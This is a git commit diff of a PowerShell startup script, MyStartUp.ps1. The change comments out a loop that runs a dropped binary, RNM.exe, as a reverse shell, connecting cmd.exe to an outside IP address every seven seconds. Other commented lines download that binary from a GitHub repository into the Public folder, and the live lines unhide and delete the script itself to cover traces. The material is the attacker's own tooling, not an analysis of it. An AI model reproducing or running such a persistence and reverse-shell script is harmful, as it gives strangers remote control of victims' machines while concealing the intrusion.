2a13c420c43f0aebb76a1a885e17e1e19bd32810
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-21 22:21:56 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -6,7 +6,7 @@
 #Start-ScheduledTask -TaskName zed
 #taskkill /F /IM RNM.exe
 #Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
-while ($True) {C:\Users\Public\RNM.exe -nv 193.161.193.99 22352 -e cmd.exe;Start-Sleep 7}
+#while ($True) {C:\Users\Public\RNM.exe -nv 193.161.193.99 22352 -e cmd.exe;Start-Sleep 7}
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
 
